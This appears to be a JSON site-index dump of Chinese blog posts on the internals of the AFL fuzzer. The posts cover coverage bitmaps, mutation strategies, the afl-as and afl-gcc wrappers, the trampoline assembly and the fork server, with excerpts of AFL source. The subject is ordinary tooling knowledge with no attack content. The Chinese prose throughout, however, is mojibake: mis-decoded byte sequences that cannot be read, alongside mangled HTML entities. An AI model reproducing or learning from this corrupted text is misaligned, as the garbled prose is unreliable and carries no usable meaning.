è¦†ç›–ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ªç´§å‡‘å…±äº«çš„64KBçš„å“ˆå¸Œè¡¨ä¸­ï¼Œç§°ä¸ºè·Ÿè¸ªä½å›¾(bitmap) å½“è®¿é—®ä¸€æ¡è¾¹æ—¶ï¼Œé€šè¿‡å¢åŠ ä¸è¯¥ç‰¹å®šè¾¹çš„å“ˆå¸Œç›¸å¯¹åº”çš„ä½å›¾ä¸­çš„å€¼æ¥è®°å½•å‘½ä¸­ cur_location &#x3D; &lt;COMPILE_TIME_RANDOM&gt;; # cur_location å€¼æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä»¥ç®€åŒ–é“¾æ¥å¤æ‚é¡¹ç›®çš„è¿‡ç¨‹å¹¶ä¿æŒ XOR è¾“å‡ºå‡åŒ€åˆ†å¸ƒã€‚ shared_mem[cur_location ^ prev_location]++; # ç”±è°ƒç”¨è€…ä¼ é€’ç»™æ£€æµ‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ prev_location &#x3D; cur_location &gt;&gt; 1; # ä¿æŒå…ƒç»„çš„æ–¹å‘æ€§ ä»¥åŒºåˆ† A^B å’Œ B^A ,å¹¶ä¿æŒç´§å¯†å¾ªç¯çš„æ ‡è¯†,åŒºåˆ†A^A,B^B **ç®€å•å—è®¡ç®—å­˜åœ¨çš„é—®é¢˜ï¼š**å¯¹å·²æ‰§è¡Œçš„åŸºæœ¬å—è¿›è¡ŒæŠ€æœ¯ä¼šå¯¼è‡´ä¿¡æ¯ä¸¢å¤± ä¾‹å¦‚ï¼š å·²æ‰§è¡Œ BB1-&gt;BB2-&gt;BB3-&gt;BB4ï¼Œ æ–°çš„è·¯å¾„ï¼š BB1-&gt;BB2-&gt;BB4, BB1-&gt;BB2-&gt;BB3 æœªè¢«è®¡å…¥ï¼Œè·¯å¾„ä¸¢å¤± ç›¸æ¯”ç®€å•çš„å—è¦†ç›–è®¡ç®—ï¼šå¯ä»¥åŒºåˆ†ä¸€ä¸‹è·¯å¾„ BB1 -&gt; BB2 -&gt; BB3 -&gt; BBB4 (tuples: BB1BB2, BB2BB3, BB3BB4) BB1 -&gt; BB2 -&gt;BBB4 (tuples: BB1BB2, BB2BB4) BB1 -&gt; BB2 -&gt;BBB3 (tuples: BB1BB2, BB2BB3) æ£€æµ‹æ–°è¡Œä¸º é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š fuzzer ç»´æŠ¤å…ˆå‰æ‰§è¡Œä¸­å…ƒç»„çš„å…¨å±€æ˜ å°„ï¼›å½“ä¸€ä¸ªå˜å¼‚çš„è¾“å…¥äº§ç”Ÿä¸€ä¸ªåŒ…å«æ–°å…ƒç»„çš„æ‰§è¡Œè·Ÿè¸ªæ—¶ï¼Œç›¸åº”è¾“å…¥æ–‡ä»¶è¢«ä¿ç•™ç­‰åç»­å¤„ç†ã€‚ ä¸è§¦å‘æ‰§è¡Œè·Ÿè¸ªä¸­æ–°çš„å±€éƒ¨è§„æ¨¡çŠ¶æ€è½¬æ¢ï¼ˆå³ä¸äº§ç”Ÿæ–°å…ƒç»„ï¼‰çš„è¾“å…¥å°†è¢«ä¸¢å¼ƒï¼Œå³ä½¿å®ƒä»¬çš„æ•´ä½“æ§åˆ¶æµåºåˆ—æ˜¯å”¯ä¸€çš„ã€‚ ä¼˜åŠ¿ï¼š é¿å…è·¯å¾„çˆ†ç‚¸ è¾¾åˆ°è¾ƒé«˜çš„ç»†ç²’åº¦æ¢ç´¢ ä¸å¿…å¯¹å¤æ‚çš„æ‰§è¡Œè½¨è¿¹è¿›è¡Œä»»ä½•è®¡ç®—å¯†é›†å‹å’Œè„†å¼±çš„å…¨å±€æ¯”è¾ƒ example: #2 å­˜åœ¨(CA,AE)è¢«è®¤ä¸ºæ˜¯æ–°è·¯å¾„ï¼Œ #1: A -&gt; B -&gt; C -&gt; D -&gt; E #2: A -&gt; B -&gt; C -&gt; A -&gt; E å¤„ç†è·¯å¾„#2 æ—¶,ç”±äºå­˜åœ¨(CD,CA), ä¼šå‡ºç°ä»¥ä¸‹çš„è·¯å¾„ï¼Œä½†ä¸ä¼šè¢«è§†ä¸ºæ–°çš„è·¯å¾„ #3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E é™¤äº†æ£€æµ‹æ–°å…ƒç»„å¤–ï¼Œæ¨¡ç³Šå™¨è¿˜è€ƒè™‘ç²—ç•¥çš„å…ƒç»„å‘½ä¸­è®¡æ•°, åˆ†ä¸ºä»¥ä¸‹æ¡¶: 1ã€2ã€3ã€4-7ã€8-15ã€16-31ã€32-127ã€128+ æ¡¶å…è®¸å°†ä»ªå™¨ç”Ÿæˆçš„ 8 ä½è®¡æ•°å™¨å°±åœ°æ˜ å°„åˆ° fuzzer å¯æ‰§è¡Œæ–‡ä»¶ä¾èµ–çš„ 8 ä½ä½å›¾ï¼Œä»¥è·Ÿè¸ªå·²ç»çœ‹åˆ°çš„æ¯ä¸ªå…ƒç»„çš„æ‰§è¡Œè®¡æ•° æ¨¡ç³Šç­–ç•¥ ç¡®å®šæ€§ç­–ç•¥åŒ…æ‹¬ï¼š å…·æœ‰ä¸åŒé•¿åº¦å’Œæ­¥è·çš„è¿ç»­ä½ç¿»è½¬ï¼Œï¼ˆSequential bit flips with varying lengths and stepoversï¼‰ å°æ•´æ•°çš„é¡ºåºåŠ å‡æ³•ï¼Œï¼ˆSequential addition and subtraction of small integersï¼‰ å·²çŸ¥æœ‰è¶£æ•´æ•°çš„é¡ºåºæ’å…¥ï¼ˆ0ã€1ã€INT_MAX ç­‰ï¼‰ï¼Œï¼ˆSequential insertion of known interesting integers (0, 1, INT_MAX, etc)) éç¡®å®šæ€§æ­¥éª¤åŒ…æ‹¬: å †å ä½ç¿»è½¬ (stacked bit flips) æ’å…¥ (insertions) åˆ é™¤ (deletions) ç®—æœ¯ (arithmetics) ä¸åŒæµ‹è¯•ç”¨ä¾‹çš„æ‹¼æ¥ (splicing of different test cases) afl-as.c è®¾è®¡æ€æƒ³ï¼š å½“ä½¿ç”¨ afl-gcc / afl-clang ç¼–è¯‘ç¨‹åºæ—¶ï¼Œå·¥å…·é“¾ä¼šè‡ªåŠ¨å¯»æ‰¾afl-asçš„ä½ç½®ï¼Œå¹¶è°ƒç”¨æ­¤æ–‡ä»¶ç¼–è¯‘çš„ç¨‹åºafl-asã€‚ æ­¤æ±‡ç¼–åŒ…è£…å™¨çš„ç›®çš„æ˜¯ é¢„å¤„ç†ç”±GCC/clangç”Ÿæˆçš„æ±‡ç¼–æ–‡ä»¶ å¤„ç†è¾“å…¥çš„å‚æ•°å‘½ä»¤ï¼Œä¸ºè°ƒç”¨çœŸæ­£çš„asæ±‡ç¼–å™¨å‡†å¤‡ã€‚ å¹¶åœ¨åˆ†æ”¯å¤„æ’æ¡© afl-as.h ä¸­åŒ…å«çš„æ£€æµ‹ä½ã€‚ å¤„ç†è¾“å…¥æ–‡ä»¶ï¼Œç”Ÿæˆ modified_fileã€‚ æ ¹æ®afl-as.håœ¨åˆé€‚çš„çš„åœ°æ–¹æ’æ¡©ã€‚ æ’æ¡©æ‰§è¡Œä»£ç ï¼š fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,R(MAP_SIZE)); å…¶æœ¬è´¨ä¸Šæƒ³æ•è·å¦‚ä¸‹ä½ç½®ï¼š ^main: - function entry point (always instrumented) ^.L0: - GCC branch label ^.LBB0_0: - clang branch label (but only in clang mode) ^\\tjnz foo - conditional branches ä½¿ç”¨execvpè°ƒç”¨asè¿›è¡ŒçœŸæ­£çš„æ±‡ç¼– execvp(as_params[0], (char**)as_params) afl-as.h æ’æ¡©éƒ¨åˆ† // ä¼ªä»£ç  cur_location = &lt;COMPILE_TIME_RANDOM>; # cur_location å€¼æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä»¥ç®€åŒ–é“¾æ¥å¤æ‚é¡¹ç›®çš„è¿‡ç¨‹å¹¶ä¿æŒ XOR è¾“å‡ºå‡åŒ€åˆ†å¸ƒã€‚ shared_mem[cur_location ^ prev_location]++; # ç”±è°ƒç”¨è€…ä¼ é€’ç»™æ£€æµ‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ prev_location = cur_location >> 1; # ä¿æŒå…ƒç»„çš„æ–¹å‘æ€§ ä»¥åŒºåˆ† A^B å’Œ B^A ,å¹¶ä¿æŒç´§å¯†å¾ªç¯çš„æ ‡è¯†,åŒºåˆ†A^A,B^B è¯´æ˜ï¼š å­˜å‚¨ XORå¼‚æˆ–æ•°æ®å¯¹ï¼š 1) å½“å‰æ‰§è¡Œåˆ†æ”¯çš„æ ‡è¯†ç¬¦; 2)ä¹‹å‰æ‰§è¡Œçš„åˆ†æ”¯çš„æ ‡è¯†ç¬¦ã€‚å³TLï¼ŒDR æ‰§è¡Œ shm_trace_map[cur_loc ^ prev_loc]++ æ’æ¡©æ“ä½œ fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,R(MAP_SIZE)); fprintf()å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ·»åŠ åˆ°æ±‡ç¼–æ–‡ä»¶çš„ç›¸åº”ä½ç½®ï¼Œtrampoline_fmt_64çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š /** * è¿™ä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œä¸»è¦çš„æ“ä½œæ˜¯ï¼š * ä¿å­˜rdxç­‰å¯„å­˜å™¨ * å°†rcxçš„å€¼è®¾ç½®ä¸ºfprintf()æ‰€è¦æ‰“å°çš„å˜é‡å†…å®¹ * è°ƒç”¨æ–¹æ³•__afl_maybe_log() * æ¢å¤å¯„å­˜å™¨ */ static const u8* trampoline_fmt_64 = \"\\n\" \"/* --- AFL TRAMPOLINE (64-BIT) --- */\\n\" \"\\n\" \".align 4\\n\" \"\\n\" \"leaq -(128+24)(%%rsp), %%rsp\\n\" \"movq %%rdx, 0(%%rsp)\\n\" \"movq %%rcx, 8(%%rsp)\\n\" \"movq %%rax, 16(%%rsp)\\n\" \"movq $0x%08x, %%rcx\\n\" \"call __afl_maybe_log\\n\" \"movq 16(%%rsp), %%rax\\n\" \"movq 8(%%rsp), %%rcx\\n\" \"movq 0(%%rsp), %%rdx\\n\" \"leaq (128+24)(%%rsp), %%rsp\\n\" \"\\n\" \"/* --- END --- */\\n\" \"\\n\"; __afl_maybe_logä½œä¸ºæ’æ¡©ä»£ç æ‰€æ‰§è¡Œçš„å®é™…å†…å®¹ï¼Œåˆ†æ&quot;movl $0x%08x, %%ecx\\n&quot;è¿™æ¡æŒ‡ä»¤ R(MAP_SIZE)å³ä¸ºä¸Šè¿°æŒ‡ä»¤å°†rcxè®¾ç½®çš„å€¼ï¼Œå³ä¸ºã€‚æ ¹æ®å®šä¹‰ï¼Œå®MAP_SIZEä¸º64Kï¼Œï¼›R(x)çš„å®šä¹‰æ˜¯(random() % (x))ï¼Œæ‰€ä»¥R(MAP_SIZE)å³ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ã€‚ å› æ­¤ï¼Œåœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯ï¼Œéœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œafl-asä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨ecxä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„keyã€‚ æ£€æŸ¥ SHM åŒºåŸŸæ˜¯å¦å·²æ˜ å°„ static const u8* main_payload_64 = Â·Â·Â·Â·Â· \" /* Check if SHM region is already mapped. */\\n\" \"\\n\" \" movq __afl_area_ptr(%rip), %rdx\\n\" \" testq %rdx, %rdx\\n\" \" je __afl_setup\\n\" \"\\n\" Â·Â·Â·Â·Â· åˆ†æ”¯è®°å½• static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \"__afl_store:\\n\" \"\\n\" \" /* Calculate and store hit for the code location specified in rcx. */\\n\" \"\\n\" #ifndef COVERAGE_ONLY \" xorq __afl_prev_loc(%rip), %rcx\\n\" \" xorq %rcx, __afl_prev_loc(%rip)\\n\" \" shrq $1, __afl_prev_loc(%rip)\\n\" #endif /* ^!COVERAGE_ONLY */ \"\\n\" #ifdef SKIP_COUNTS \" orb $1, (%rdx, %rcx, 1)\\n\" #else \" incb (%rdx, %rcx, 1)\\n\" #endif /* ^SKIP_COUNTS */ Â·Â·Â·Â·Â· å¯¹åº”ä¼ªä»£ç  shared_mem[cur_location ^ prev_location]++; å…·ä½“åœ°ï¼Œå˜é‡__afl_prev_locä¿å­˜çš„æ˜¯å‰ä¸€æ¬¡è·³è½¬çš„â€ä½ç½®â€ï¼Œå…¶å€¼ä¸rcxåšå¼‚æˆ–åï¼Œä¿å­˜åœ¨ripä¸­ï¼Œå¹¶ä»¥rdxï¼ˆå…±äº«å†…å­˜ï¼‰ä¸ºåŸºå€ï¼Œå¯¹rcxä¸‹æ ‡å¤„è¿›è¡ŒåŠ ä¸€æ“ä½œã€‚è€Œripçš„å€¼å³ç§»1ä½åï¼Œä¿å­˜åœ¨äº†å˜é‡__afl_prev_locä¸­ã€‚ åˆ™è¿™é‡Œçš„rcxï¼Œä¿å­˜çš„ä¸ºä¼ªä»£ç ä¸­çš„cur_locationã€‚å›å¿†ä¹‹å‰ä»‹ç»ä»£ç æ’æ¡©çš„éƒ¨åˆ†ï¼š static const u8* trampoline_fmt_64 = Â·Â·Â·Â·Â·Â· \"movq $0x%08x, %%rcx\\n\" \"call __afl_maybe_log\\n\" Â·Â·Â·Â·Â·Â· åœ¨æ¯ä¸ªæ’æ¡©å¤„ï¼Œafl-asä¼šæ·»åŠ ç›¸åº”æŒ‡ä»¤ï¼Œå°†rcxçš„å€¼è®¾ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„æŸä¸ªéšæœºæ•°ï¼Œä»è€Œå®ç°äº†ä¼ªä»£ç ä¸­çš„cur_location = &lt;COMPILE_TIME_RANDOM&gt;; å› æ­¤ï¼ŒAFLä¸ºæ¯ä¸ªä»£ç å—ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºå…¶â€œä½ç½®â€çš„è®°å½•ï¼›éšåï¼Œå¯¹åˆ†æ”¯å¤„çš„â€æºä½ç½®â€œå’Œâ€ç›®æ ‡ä½ç½®â€œè¿›è¡Œå¼‚æˆ–ï¼Œå¹¶å°†å¼‚æˆ–çš„ç»“æœä½œä¸ºè¯¥åˆ†æ”¯çš„keyï¼Œä¿å­˜æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ã€‚ç”¨äºä¿å­˜æ‰§è¡Œæ¬¡æ•°çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¤§å°ä¸ºMAP_SIZE=64Kã€‚ afl-gcc.c **è®¾è®¡æ€æƒ³: ** å½“å‰ç³»ç»Ÿè·¯å¾„ä¸­æ‰¾åˆ°afl-asæ±‡ç¼–å™¨æ‰€åœ¨ä½ç½®ï¼Œè°ƒç”¨afls-as , afl-asä»¥asçš„åˆ«åå½¢å¼å­˜åœ¨ æ’æ¡©æ£€æµ‹ä½ã€‚ç¼–è¯‘å™¨é»˜è®¤ä¼˜å…ˆä½¿ç”¨è¯¥è·¯å¾„ä¸­çš„æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ï¼Œå³ afl-asï¼Œå®é™…çš„æ’æ¡©å·¥ä½œå‘ç”Ÿåœ¨æ±‡ç¼–çš„æ—¶å€™ è¯»å–è¾“å…¥çš„å‚æ•°å‘½ä»¤ï¼Œæ ¹æ®è¾“å…¥çš„å‚æ•°å‘½ä»¤ CC&#x3D;%s&#x2F;afl-gcc .&#x2F;configure CXX&#x3D;%s&#x2F;afl-g++ .&#x2F;configure 1). åˆ¤æ–­ä½¿ç”¨çš„aflç¼–è¯‘å™¨å¯¹åº”çœŸå®çš„ç¼–è¯‘å™¨ gcc/g++ æˆ– clang/clang++ å°†çœŸå®ç¼–è¯‘å™¨å¡«å…¥cc_params[0]ä¸­ afl-gcc -&gt; gcc afl-g++ -&gt; g++ afl-clang++ -&gt;clang++ afl-clang -&gt; clang 2). è¯»å–å…¶ä»–ç›¸åº”çš„å‚æ•°ï¼Œå¹¶å¡«å……åˆ°cc_paramsæ•°ç»„ä¸­ è°ƒç”¨ç³»ç»Ÿå‘½ä»¤execvp æ‰§è¡ŒçœŸå®çš„ç¼–è¯‘å™¨ execvp(cc_params[0], (char**)cc_params); execvpï¼ˆï¼‰çš„åŸºæœ¬è¯­æ³• (Basic Syntax of execvp()) This function takes in the name of the UNIX command to run, as the first argument. è¯¥å‡½æ•°å°†è¦è¿è¡Œçš„UNIXå‘½ä»¤çš„åç§°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚ This is there in the &lt;unistd.h&gt; header file, so we must include it in our program. è¯¥æ–‡ä»¶ä½äº&lt;unistd.h&gt;å¤´æ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»å°†å…¶åŒ…å«åœ¨ç¨‹åºä¸­ã€‚ #include &lt;unistd.h> int execvp(const char* command, char* argv[]); Here, we refer to a â€œcommandâ€ as any binary executable file that is a part of the PATH environment variable. So, if you want to run custom programs, make sure that you add it to your PATH variable! åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†â€œå‘½ä»¤â€ç§°ä¸ºPATHç¯å¢ƒå˜é‡ä¸€éƒ¨åˆ†çš„ä»»ä½•äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å› æ­¤ï¼Œå¦‚æœè¦è¿è¡Œè‡ªå®šä¹‰ç¨‹åºï¼Œè¯·ç¡®ä¿å°†å…¶æ·»åŠ åˆ°PATHå˜é‡ä¸­ï¼ The second argument (argv) represents the list of arguments to command. This is an array of char* strings. ç¬¬äºŒä¸ªå‚æ•°ï¼ˆ argv ï¼‰è¡¨ç¤ºcommandçš„å‚æ•°åˆ—è¡¨ã€‚ è¿™æ˜¯ä¸€ä¸ªchar*å­—ç¬¦ä¸²æ•°ç»„ã€‚ Here, argv contains the complete command, along with itâ€™s arguments. åœ¨è¿™é‡Œï¼Œ argvåŒ…å«å®Œæ•´çš„å‘½ä»¤åŠå…¶å‚æ•°ã€‚","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"},{"name":"AFL","slug":"AFL","permalink":"https://www.sizaif.com/tags/AFL/"}],"author":"sizaif"},{"title":"AFL(american Fuzzy Lop)å­¦ä¹ ä¸‰","slug":"AFL-american-fuzzy-lop-å­¦ä¹ ä¸‰","date":"2022-04-19T02:36:54.000Z","updated":"2022-04-19T02:42:26.116Z","comments":true,"path":"posts/77c87ed3/","link":"","permalink":"https://www.sizaif.com/posts/77c87ed3/","excerpt":"","text":"AFL(american fuzzy lop)å­¦ä¹ ä¸‰ @sizaif @2022-04-11 fork Server ä¸ºäº†æé«˜æ€§èƒ½ï¼Œafl-fuzz ä½¿ç”¨â€œfork serverâ€ï¼Œå…¶ä¸­æ¨¡ç³Šå¤„ç†çš„è¿›ç¨‹åªç»è¿‡ä¸€æ¬¡execve()ã€linkå’Œ libc 0initializationï¼Œç„¶åé€šè¿‡åˆ©ç”¨å†™æ—¶å¤åˆ¶ä»åœæ­¢çš„è¿›ç¨‹æ˜ åƒä¸­å…‹éš†ã€‚ **å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼š**å¯åŠ¨targetè¿›ç¨‹åï¼Œtargetä¼šè¿è¡Œä¸€ä¸ªfork serverï¼›fuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œã€‚è¿™æ ·è®¾è®¡çš„æœ€å¤§å¥½å¤„ï¼Œå°±æ˜¯ä¸éœ€è¦è°ƒç”¨execve()ï¼Œä»è€ŒèŠ‚çœäº†è½½å…¥ç›®æ ‡æ–‡ä»¶å’Œåº“ã€è§£æç¬¦å·åœ°å€ç­‰é‡å¤æ€§å·¥ä½œã€‚ å…·ä½“è¿è¡ŒåŸç†: é¦–å…ˆfuzzeræ‰§è¡Œfork()å¾—åˆ°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ï¼Œè¿™é‡Œçš„çˆ¶è¿›ç¨‹ä»ç„¶ä¸ºfuzzerï¼Œå­è¿›ç¨‹åˆ™ä¸ºtargetè¿›ç¨‹ï¼Œå³å°†æ¥çš„fork serverã€‚ EXP_ST void init_forkserver(char** argv) &#123; Â·Â·Â·Â·Â·Â· forksrv_pid = fork(); Â·Â·Â·Â·Â·Â· &#125; è€Œçˆ¶å­è¿›ç¨‹ä¹‹é—´ï¼Œæ˜¯é€šè¿‡ç®¡é“è¿›è¡Œé€šä¿¡ã€‚å…·ä½“ä½¿ç”¨äº†2ä¸ªç®¡é“ï¼Œä¸€ä¸ªç”¨äºä¼ é€’çŠ¶æ€ï¼Œå¦ä¸€ä¸ªç”¨äºä¼ é€’å‘½ä»¤ï¼š int st_pipe[2], ctl_pipe[2]; å¯¹äºå­è¿›ç¨‹ï¼ˆfork serverï¼‰ï¼Œä¼šè¿›è¡Œä¸€ç³»åˆ—è®¾ç½®ï¼Œå…¶ä¸­åŒ…æ‹¬å°†ä¸Šè¿°ä¸¤ä¸ªç®¡é“åˆ†é…åˆ°é¢„å…ˆæŒ‡å®šçš„fdï¼Œå¹¶æœ€ç»ˆæ‰§è¡Œtargetï¼š if (!forksrv_pid) &#123; Â·Â·Â·Â·Â·Â· /* Set up control and status pipes, close the unneeded original fds. */ if (dup2(ctl_pipe[0], FORKSRV_FD) &lt; 0) PFATAL(\"dup2() failed\"); if (dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0) PFATAL(\"dup2() failed\"); Â·Â·Â·Â·Â·Â· execv(target_path, argv); &#125; å¯¹äºçˆ¶è¿›ç¨‹ï¼ˆfuzzerï¼‰ï¼Œåˆ™ä¼šè¯»å–çŠ¶æ€ç®¡é“çš„ä¿¡æ¯ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™è¯´æ˜fork serveråˆ›å»ºå®Œæˆã€‚ fsrv_st_fd = st_pipe[0]; Â·Â·Â·Â·Â·Â· rlen = read(fsrv_st_fd, &amp;status, 4); Â·Â·Â·Â·Â·Â· /* If we have a four-byte \"hello\" message from the server, we're all set. Otherwise, try to figure out what went wrong. */ if (rlen == 4) &#123; OKF(\"All right - fork server is up.\"); return; &#125; fork serverä¸fuzzeré€šä¿¡ fork serverä¾§çš„å…·ä½“æ“ä½œ æ–¹æ³•__afl_maybe_log()ä¸­ã€‚é¦–å…ˆï¼Œé€šè¿‡å†™å…¥çŠ¶æ€ç®¡é“ï¼Œfork serverä¼šé€šçŸ¥fuzzerï¼Œå…¶å·²ç»å‡†å¤‡å®Œæ¯•ï¼Œå¯ä»¥å¼€å§‹forkäº†ï¼Œè€Œè¿™æ­£æ˜¯ä¸Šé¢æåˆ°çš„çˆ¶è¿›ç¨‹ç­‰å¾…çš„ä¿¡æ¯ï¼š static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \"__afl_forkserver:\\n\" \"\\n\" \" /* Enter the fork server mode to avoid the overhead of execve() calls. We\\n\" \" push rdx (area ptr) twice to keep stack alignment neat. */\\n\" \"\\n\" \" pushq %rdx\\n\" \" pushq %rdx\\n\" \"\\n\" \" /* Phone home and tell the parent that we're OK. (Note that signals with\\n\" \" no SA_RESTART will mess it up). If this fails, assume that the fd is\\n\" \" closed because we were execve()d from an instrumented binary, or because\\n\" \" the parent doesn't want to use the fork server. */\\n\" \"\\n\" \" movq $4, %rdx /* length */\\n\" \" leaq __afl_temp(%rip), %rsi /* data */\\n\" \" movq $\" STRINGIFY((FORKSRV_FD + 1)) \", %rdi /* file desc */\\n\" CALL_L64(\"write\") \"\\n\" \" cmpq $4, %rax\\n\" \" jne __afl_fork_resume\\n\" Â·Â·Â·Â·Â·Â· æ¥ä¸‹æ¥ï¼Œfork serverè¿›å…¥ç­‰å¾…çŠ¶æ€__afl_fork_wait_loopï¼Œè¯»å–å‘½ä»¤ç®¡é“ï¼Œç›´åˆ°fuzzeré€šçŸ¥å…¶å¼€å§‹forkï¼š static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \"__afl_fork_wait_loop:\\n\" \"\\n\" \" /* Wait for parent by reading from the pipe. Abort if read fails. */\\n\" \"\\n\" \" movq $4, %rdx /* length */\\n\" \" leaq __afl_temp(%rip), %rsi /* data */\\n\" \" movq $\" STRINGIFY(FORKSRV_FD) \", %rdi /* file desc */\\n\" CALL_L64(\"read\") \" cmpq $4, %rax\\n\" \" jne __afl_die\\n\" \"\\n\" Â·Â·Â·Â·Â·Â· ä¸€æ—¦fork serveræ¥æ”¶åˆ°fuzzerçš„ä¿¡æ¯ï¼Œä¾¿è°ƒç”¨fork()ï¼Œå¾—åˆ°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ï¼š static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \" /* Once woken up, create a clone of our process. This is an excellent use\\n\" \" case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\\n\" \" caches getpid() results and offers no way to update the value, breaking\\n\" \" abort(), raise(), and a bunch of other things :-( */\\n\" \"\\n\" CALL_L64(\"fork\") \" cmpq $0, %rax\\n\" \" jl __afl_die\\n\" \" je __afl_fork_resume\\n\" \"\\n\" Â·Â·Â·Â·Â·Â· å­è¿›ç¨‹æ˜¯å®é™…æ‰§è¡Œtargetçš„è¿›ç¨‹ï¼Œå…¶è·³è½¬åˆ°__afl_fork_resumeã€‚åœ¨è¿™é‡Œä¼šå…³é—­ä¸å†éœ€è¦çš„ç®¡é“ï¼Œå¹¶ç»§ç»­æ‰§è¡Œï¼š static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \"__afl_fork_resume:\\n\" \"\\n\" \" /* In child process: close fds, resume execution. */\\n\" \"\\n\" \" movq $\" STRINGIFY(FORKSRV_FD) \", %rdi\\n\" CALL_L64(\"close\") \"\\n\" \" movq $\" STRINGIFY((FORKSRV_FD + 1)) \", %rdi\\n\" CALL_L64(\"close\") \"\\n\" \" popq %rdx\\n\" \" popq %rdx\\n\" \"\\n\" \" movq %r12, %rsp\\n\" \" popq %r12\\n\" \"\\n\" \" movq 0(%rsp), %rax\\n\" \" movq 8(%rsp), %rcx\\n\" \" movq 16(%rsp), %rdi\\n\" \" movq 32(%rsp), %rsi\\n\" \" movq 40(%rsp), %r8\\n\" \" movq 48(%rsp), %r9\\n\" \" movq 56(%rsp), %r10\\n\" \" movq 64(%rsp), %r11\\n\" \"\\n\" \" movq 96(%rsp), %xmm0\\n\" \" movq 112(%rsp), %xmm1\\n\" \" movq 128(%rsp), %xmm2\\n\" \" movq 144(%rsp), %xmm3\\n\" \" movq 160(%rsp), %xmm4\\n\" \" movq 176(%rsp), %xmm5\\n\" \" movq 192(%rsp), %xmm6\\n\" \" movq 208(%rsp), %xmm7\\n\" \" movq 224(%rsp), %xmm8\\n\" \" movq 240(%rsp), %xmm9\\n\" \" movq 256(%rsp), %xmm10\\n\" \" movq 272(%rsp), %xmm11\\n\" \" movq 288(%rsp), %xmm12\\n\" \" movq 304(%rsp), %xmm13\\n\" \" movq 320(%rsp), %xmm14\\n\" \" movq 336(%rsp), %xmm15\\n\" \"\\n\" \" leaq 352(%rsp), %rsp\\n\" \"\\n\" \" jmp __afl_store\\n\" Â·Â·Â·Â·Â·Â· çˆ¶è¿›ç¨‹åˆ™ä»ç„¶ä½œä¸ºfork serverè¿è¡Œï¼Œå…¶ä¼šå°†å­è¿›ç¨‹çš„pidé€šè¿‡çŠ¶æ€ç®¡é“å‘é€ç»™fuzzerï¼Œå¹¶ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼›ä¸€æ—¦å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œåˆ™å†é€šè¿‡çŠ¶æ€ç®¡é“ï¼Œå°†å…¶ç»“æŸçŠ¶æ€å‘é€ç»™fuzzerï¼›ä¹‹åå†æ¬¡è¿›å…¥ç­‰å¾…çŠ¶æ€__afl_fork_wait_loopï¼š static const u8* main_payload_64 = Â·Â·Â·Â·Â·Â· \" /* In parent process: write PID to pipe, then wait for child. */\\n\" \"\\n\" \" movl %eax, __afl_fork_pid(%rip)\\n\" \"\\n\" \" movq $4, %rdx /* length */\\n\" \" leaq __afl_fork_pid(%rip), %rsi /* data */\\n\" \" movq $\" STRINGIFY((FORKSRV_FD + 1)) \", %rdi /* file desc */\\n\" CALL_L64(\"write\") \"\\n\" \" movq $0, %rdx /* no flags */\\n\" \" leaq __afl_temp(%rip), %rsi /* status */\\n\" \" movq __afl_fork_pid(%rip), %rdi /* PID */\\n\" 